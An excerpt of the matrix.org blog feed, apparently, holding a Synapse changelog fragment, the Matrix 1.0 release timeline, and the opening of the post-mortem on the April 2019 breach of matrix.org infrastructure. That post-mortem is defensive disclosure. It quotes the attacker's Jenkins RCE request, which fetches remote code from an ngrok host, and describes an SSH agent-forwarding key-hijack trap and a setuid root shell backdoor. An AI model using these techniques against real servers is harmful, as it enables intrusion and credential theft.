&lt;li&gt;Improve sample config for monthly active user blocking. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5284&quot;&gt;#5284&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Remove spurious debug from MatrixFederationHttpClient.get_json. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5287&quot;&gt;#5287&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Improve logging for logcontext leaks. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5288&quot;&gt;#5288&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Clarify that the admin change password API logs the user out. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5303&quot;&gt;#5303&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;New installs will now use the v54 full schema, rather than the full schema v14 and applying incremental updates to v54. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5320&quot;&gt;#5320&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Improve docstrings on MatrixFederationClient. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5332&quot;&gt;#5332&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Clean up FederationClient.get_events for clarity. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5344&quot;&gt;#5344&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Various improvements to debug logging. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5353&quot;&gt;#5353&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Don&#x27;t run CI build checks until sample config check has passed. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5370&quot;&gt;#5370&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Automatically retry buildkite builds (max twice) when an agent is lost. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5380&quot;&gt;#5380&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Final countdown to 1.0</title>
        <published>2019-05-24T00:00:00+00:00</published>
        <updated>2019-05-24T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/05/24/final-countdown-to-1-0/" type="text/html"/>
        <id>https://matrix.org/blog/2019/05/24/final-countdown-to-1-0/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;After lots of refinements, polishing and a few distractions we’re finally at the point of announcing the final timeline for both Matrix 1.0 and Synapse 1.0! We are targeting &lt;strong&gt;Monday 10th June&lt;&#x2F;strong&gt; as our release date - please consider this your two week warning!&lt;&#x2F;p&gt;
&lt;p&gt;This is the end game of the process we began back in February when we released the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;02&#x2F;04&#x2F;matrix-at-fosdem-2019&quot;&gt;first stable release of the Server-Server API&lt;&#x2F;a&gt; at FOSDEM, and started the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;02&#x2F;05&#x2F;synapse-0-99-0&quot;&gt;Synapse 0.99&lt;&#x2F;a&gt; release series to prepare for 1.0.&lt;&#x2F;p&gt;
&lt;p&gt;Matrix 1.0 refers to the upcoming set of API releases which provides a matched set of stable and secure APIs across all of Matrix - at which point the project (at last) exits beta! In practice, this will be Client-Server API 0.5 (including final membership lazy loading, E2E backups and interactive verification and lots more), SS API 0.2 (including server key validity period fixes and associated v5 room protocol) and any other spec updates. The next 2 weeks will see a flurry of spec activity as we get everything together - you can see the full list and track the progress for the CS 0.5 spec release at https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;projects&#x2F;2.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, Synapse 1.0 will be the reference implementation of Matrix 1.0, and so makes the changes required to implement Matrix 1.0 and close all currently known security and stability issues and thus exit beta. This means changing the default room protocol version used for new rooms to be &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;37871106c6fc6013c17b5711fb93853fff140267&#x2F;proposals&#x2F;2002-rooms-v4.md&quot;&gt;v4&lt;&#x2F;a&gt;, which includes the new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;f714aaadd011ac736d779f8460202a8d95799123&#x2F;proposals&#x2F;1442-state-resolution.md&quot;&gt;state resolution algorithm&lt;&#x2F;a&gt;, as well as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;erikj&#x2F;event_id_hashes&#x2F;proposals&#x2F;1659-event-id-as-hashes.md&quot;&gt;collision-resistant event IDs&lt;&#x2F;a&gt;, which are now formatted to be &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;no_slash_in_event_id&#x2F;proposals&#x2F;1884-replace-slashes-in-event_ids.md&quot;&gt;URL safe&lt;&#x2F;a&gt;. &lt;strong&gt;Support for v4 rooms shipped in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;21&#x2F;synapse-0-99-5-1-released&quot;&gt;Synapse 0.99.5.1&lt;&#x2F;a&gt;, so please upgrade asap to 0.99.5.1 before 1.0 is released to ease the transition.&lt;&#x2F;strong&gt;. Synapse 1.0 will also ship with support for the upcoming v5 room protocol (which enforces honouring server key validity periods), but this will not used as the default for new rooms until sufficient servers are speaking Matrix 1.0.&lt;&#x2F;p&gt;
&lt;p&gt;As part of the security work, Matrix 1.0 and Synapse 1.0 also contains a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything&quot;&gt;breaking change&lt;&#x2F;a&gt; that requires a valid TLS certificate on the federation API endpoint. &lt;strong&gt;Servers that do not configure their certificate will no longer be able to federate post 1.0&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;You can check that your server has been correctly configured &lt;a href=&quot;https:&#x2F;&#x2F;federationtester.matrix.org&#x2F;&quot;&gt;here&lt;&#x2F;a&gt; and see &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md&quot;&gt;here&lt;&#x2F;a&gt; for more info on what you need to do. If in doubt head to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#synapse:matrix.org&quot;&gt;#synapse:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve been tracking readiness for the certificate change at https:&#x2F;&#x2F;arewereadyyet.com, at the time of writing 68% of active &lt;em&gt;servers&lt;&#x2F;em&gt; on the federation have valid certificates. We obviously would want that number to be higher, however since the largest installations &lt;em&gt;have&lt;&#x2F;em&gt; upgraded the total number of &lt;em&gt;users&lt;&#x2F;em&gt; who are ready for 1.0 stands at 96%, which we consider to be high enough to release 1.0.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;awry.2019-05-24.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;This is not a drill&lt;&#x2F;strong&gt;, from here until 10th June we need everyone to not only ensure that their own server is ready, but also to encourage their fellow admins to update as well. With your help we can get everyone over the line!&lt;&#x2F;p&gt;
&lt;p&gt;Thanks everyone for your help to date, especially those providing support in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#synapse:matrix.org&quot;&gt;#synapse:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Onwards!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Post-mortem and remediations for Apr 11 security incident</title>
        <published>2019-05-08T00:00:00+00:00</published>
        <updated>2019-05-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/" type="text/html"/>
        <id>https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident/</id>
        
        <content type="html">&lt;h3 id=&quot;table-of-contents&quot;&gt;Table of contents&lt;&#x2F;h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#introduction&quot;&gt;Introduction&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#history&quot;&gt;History&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-incident&quot;&gt;The Incident&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-defacement&quot;&gt;The Defacement&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#the-rebuild&quot;&gt;The Rebuild&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#remediations&quot;&gt;Remediations&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh&quot;&gt;SSH&lt;&#x2F;a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-agent-forwarding-should-be-disabled&quot;&gt;SSH agent forwarding should be disabled.&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-should-not-be-exposed-to-the-general-internet&quot;&gt;SSH should not be exposed to the general internet&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-keys-should-give-minimal-access&quot;&gt;SSH keys should give minimal access&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#two-factor-authentication&quot;&gt;Two factor authentication&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys&quot;&gt;It should be made as hard as possible to add malicious SSH keys&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#changes-to-ssh-keys-should-be-carefully-monitored&quot;&gt;Changes to SSH keys should be carefully monitored&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#ssh-config-should-be-hardened-disabling-unnecessary-options&quot;&gt;SSH config should be hardened, disabling unnecessary options&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#network-architecture&quot;&gt;Network architecture&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#keeping-patched&quot;&gt;Keeping patched&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#intrusion-detection&quot;&gt;Intrusion detection&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#incident-management&quot;&gt;Incident management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#configuration-management&quot;&gt;Configuration management&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#avoiding-temporary-measures-which-last-forever&quot;&gt;Avoiding temporary measures which last forever&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#secure-packaging&quot;&gt;Secure packaging&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#dev-and-ci-infrastructure&quot;&gt;Dev and CI infrastructure&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#log-minimisation-and-handling-personally-identifying-information-pii&quot;&gt;Log minimisation and handling Personally Identifying Information (PII)&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;#conclusion&quot;&gt;Conclusion&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h3&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;On April 11th we dealt with a major security incident impacting the infrastructure which runs the Matrix.org homeserver - specifically: removing an attacker who had gained superuser access to much of our production network.  We provided updates at the time as events unfolded on April 11 and 12 via &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;1116304867683905537&quot;&gt;Twitter&lt;&#x2F;a&gt; and our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&#x2F;&quot;&gt;blog&lt;&#x2F;a&gt;, but in this post we’ll try to give a full analysis of what happened and, critically, what we have done to avoid this happening again in future.  Apologies that this has taken several weeks to put together: the time-consuming process of rebuilding after the breach has had to take priority, and we also wanted to get the key remediation work in place before writing up the post-mortem.&lt;&#x2F;p&gt;
&lt;p&gt;Firstly, please understand that &lt;strong&gt;this incident was not due to issues in the Matrix protocol itself or the wider Matrix network&lt;&#x2F;strong&gt; - and indeed everyone who wasn’t on the Matrix.org server should have barely noticed.  If you see someone say “Matrix got hacked”, please politely but firmly explain to them that the servers which run the oldest and biggest instance got compromised via a Jenkins vulnerability and bad ops practices, but &lt;strong&gt;the protocol and network itself was not impacted&lt;&#x2F;strong&gt;.  This is not to say that the Matrix protocol itself is bug free - indeed we are still in the process of exiting beta (delayed by this incident), but &lt;strong&gt;this incident was not related to the protocol&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Before we get stuck in, we would like to apologise unreservedly to everyone impacted by this whole incident.  Matrix is an altruistic open source project, and our mission is to try to make the world a better place by providing a secure decentralised communication protocol and network for the benefit of everyone; giving users total control back over how they communicate online.&lt;&#x2F;p&gt;
&lt;p&gt;In this instance, our focus on trying to improve the protocol and network came at the expense of investing sysadmin time around the legacy Matrix.org homeserver and project infrastructure which we provide as a free public service to help bootstrap the Matrix ecosystem, and we paid the price.&lt;&#x2F;p&gt;
&lt;p&gt;This post will hopefully illustrate that we have learnt our lessons from this incident and will not be repeating them - and indeed intend to come out of this episode stronger than you can possibly imagine :)&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, if you think that the world needs Matrix, &lt;strong&gt;please&lt;&#x2F;strong&gt; consider supporting us via &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt; or &lt;a href=&quot;http:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt;.  Not only will this make it easier for us to invest in our infrastructure in future, it also makes projects like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt;Pantalaimon&lt;&#x2F;a&gt; (E2EE compatibility for all Matrix clients&#x2F;bots) possible, which are effectively being financed entirely by donations.  The funding we raised in Jan 2018 is not going to last forever, and we are currently looking into new longer-term funding approaches - for which we need your support.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, if you happen across security issues in Matrix or matrix.org’s infrastructure, please please consider disclosing them responsibly to us as per our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt;, in order to help us improve our security while protecting our users.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;history&quot;&gt;History&lt;&#x2F;h3&gt;
&lt;p&gt;Firstly, some context about Matrix.org’s infrastructure.  The public Matrix.org homeserver and its associated services runs across roughly 30 hosts, spanning the actual homeserver, its DBs, load balancers, intranet services, website, bridges, bots, integrations, video conferencing, CI, etc.  We provide it as a free public service to the Matrix ecosystem to help bootstrap the network and make life easier for first-time users.&lt;&#x2F;p&gt;
&lt;p&gt;The deployment which was compromised in this incident was mainly set up back in Aug 2017 when we vacated our previous datacenter at short notice, thanks to our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2017&#x2F;07&#x2F;07&#x2F;a-call-to-arms-supporting-matrix&#x2F;&quot;&gt;funding situation&lt;&#x2F;a&gt; at the time. Previously we had been piggybacking on the well-managed production datacenters of our previous employer, but during the exodus we needed to move as rapidly as possible, and so we span up a bunch of vanilla Debian boxes on &lt;a href=&quot;https:&#x2F;&#x2F;upcloud.com&quot;&gt;UpCloud&lt;&#x2F;a&gt;, and shifted over services as simply as we could.  We had no dedicated ops people on the project at that point, so this was a subset of the Synapse and Riot&#x2F;Web dev teams putting on ops hats to rapidly get set up, whilst also juggling the daily fun of keeping the ever-growing Matrix.org server running and trying to actually develop and improve Matrix itself.&lt;&#x2F;p&gt;
&lt;p&gt;In practice, this meant that some corners were cut that we expected to be able to come back to and address once we had dedicated ops staff on the team.  For instance, we skipped setting up a VPN for accessing production in favour of simply SSHing into the servers over the internet.  We also went for the simplest possible config management system: checking all the configs for the services into a private git repo.  We also didn’t spend much time hardening the default Debian installations - for instance, the default image allows root access via SSH and allows SSH agent forwarding, and the config wasn’t tweaked.  This is particularly unfortunate, given our previous production OS (a customised Debian variant) had got all these things right - but the attitude was that because we’d got this right in the past, we’d be easily able to get it right in future once we fixed up the hosts with proper configuration management etc.&lt;&#x2F;p&gt;
&lt;p&gt;Separately, we also made the controversial decision to maintain a public-facing Jenkins instance.  We did this deliberately, despite the risks associated with running a complicated publicly available service like Jenkins, but reasoned that as a FOSS project, it is imperative that we are transparent and that continuous integration results and artefacts are available and directly visible to all contributors - whether they are part of the core dev team or not.  So we put Jenkins on its own host, gave it some macOS build slaves, and resolved to keep an eye open for any security alerts which would require an upgrade.&lt;&#x2F;p&gt;
&lt;p&gt;Lots of stuff then happened over the following months - we &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;01&#x2F;29&#x2F;status-partners-up-with-new-vector-fueling-decentralised-comms-and-the-matrix-ecosystem&#x2F;&quot;&gt;secured funding&lt;&#x2F;a&gt; in Jan 2018; the French Government began talking about &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2018&#x2F;04&#x2F;26&#x2F;matrix-and-riot-confirmed-as-the-basis-for-frances-secure-instant-messenger-app&#x2F;&quot;&gt;switching to Matrix&lt;&#x2F;a&gt; around the same time; the pressure of getting Matrix (and Synapse and Riot) out of beta and to a stable 1.0 grew ever stronger; the challenge of handling the ever-increasing traffic on the Matrix.org server soaked up more and more time, and we started to see our first major security incidents (a major DDoS in March 2018, mitigated by shielding behind Cloudflare, and various attacks on the more beta bits of Matrix itself).&lt;&#x2F;p&gt;
&lt;p&gt;Good news was that funding meant that in March 2018 we were able to hire a fulltime ops specialist!  By this point, however, we had two new critical projects in play to try to ensure long-term funding for the project via New Vector, the startup formed in 2017 to hire the core team. Firstly, to build out &lt;a href=&quot;https:&#x2F;&#x2F;modular.im&quot;&gt;Modular.im&lt;&#x2F;a&gt; as a commercial-grade Matrix SaaS provider, and secondly, to support France in rolling out their massive Matrix deployment as a flagship example how Matrix can be used.  And so, for better or worse, the brand new ops team was given a very clear mandate: to largely ignore the legacy datacenter infrastructure, and instead focus exclusively on building entirely new, pro-grade infrastructure for Modular.im and France, with the expectation of eventually migrating Matrix.org itself into Modular when ready (or just turning off the Matrix.org server entirely, once we have account portability).&lt;&#x2F;p&gt;
&lt;p&gt;So we ended up with two production environments; the legacy Matrix.org infra, whose shortcomings continued to linger and fester off the radar, and separately all the new Modular.im hosts, which are almost entirely operationally isolated from the legacy datacenter; whose configuration is managed exclusively by Ansible, and have sensible SSH configs which disallow root login etc.  With 20:20 hindsight, the failure to prioritise hardening the legacy infrastructure is quite a good example of the &lt;a href=&quot;https:&#x2F;&#x2F;fastjetperformance.com&#x2F;podcasts&#x2F;how-i-almost-destroyed-a-50-million-war-plane-when-display-flying-goes-wrong-and-the-normalisation-of-deviance&#x2F;&quot;&gt;normalisation of deviance&lt;&#x2F;a&gt; - we had gotten too used to the bad practices; all our attention was going elsewhere; and so we simply failed to prioritise getting back to fix them.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-incident&quot;&gt;The Incident&lt;&#x2F;h3&gt;
&lt;p&gt;The first evidence of things going wrong was a tweet from &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;JaikeySarraf&quot;&gt;JaikeySarraf&lt;&#x2F;a&gt;, a security researcher who kindly reached out via DM at the end of Apr 9th to warn us that our Jenkins was outdated after stumbling across it via Google.  In practice, our Jenkins was running version 2.117 with plugins which had been updated on an adhoc basis, and we had indeed missed the security advisory (partially because most of our CI pipelines had moved to TravisCI, CircleCI and Buildkite), and so on Apr 10th we updated the Jenkins and investigated to see if any vulnerabilities had been exploited.&lt;&#x2F;p&gt;
&lt;p&gt;In this process, we spotted an unrecognised SSH key in &lt;code&gt;&#x2F;root&#x2F;.ssh&#x2F;authorized_keys2&lt;&#x2F;code&gt; on the Jenkins build server.  This was suspicious both due to the key not being in our key DB and the fact the key was stored in the obscure &lt;code&gt;authorized_keys2&lt;&#x2F;code&gt; file (a legacy location from back when OpenSSH transitioned from &lt;a href=&quot;https:&#x2F;&#x2F;searchsecurity.techtarget.com&#x2F;tip&#x2F;An-introduction-to-SSH2&quot;&gt;SSH1-&amp;gt;SSH2&lt;&#x2F;a&gt;).  Further inspection showed that 19 hosts in total had the same key present in the same place.&lt;&#x2F;p&gt;
&lt;p&gt;At this point we started doing forensics to understand the scope of the attack and plan the response, as well as taking snapshots of the hosts to protect data in case the attacker realised we were aware and attempted to vandalise or cover their tracks.  Findings were:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The attacker had first compromised Jenkins on March 13th via an RCE vulnerability (CVE-2019-1003000 - &lt;a href=&quot;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46572&quot;&gt;https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;46572&lt;&#x2F;a&gt;):&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;code&gt;matrix.org:443 151.34.xxx.xxx - - [13&#x2F;Mar&#x2F;2019:18:46:07 +0000] &amp;quot;GET &#x2F;jenkins&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition&#x2F;checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http:&#x2F;&#x2F;5f36xxxx.ngrok.io&#x2F;jenkins&#x2F;%27)%0A@Grab(group=%27tw.orange%27,%20module=%270x3a%27,%20version=%27000%27)%0Aimport%20Orange; HTTP&#x2F;1.1&amp;quot; 500 6083 &amp;quot;-&amp;quot; &amp;quot;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:47.0) Gecko&#x2F;20100101 Firefox&#x2F;47.0&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot&#x2F;iOS and Riot&#x2F;Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker’s SSH key to root@ on as many other hosts as possible.&lt;&#x2F;li&gt;
&lt;li&gt;On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH’d into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.&lt;&#x2F;li&gt;
&lt;li&gt;From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at &lt;code&gt;&#x2F;usr&#x2F;share&#x2F;bsd-mail&#x2F;shroot&lt;&#x2F;code&gt;).&lt;&#x2F;li&gt;
&lt;li&gt;The majority of access to the hosts occurred between Apr 4th and 6th.&lt;&#x2F;li&gt;
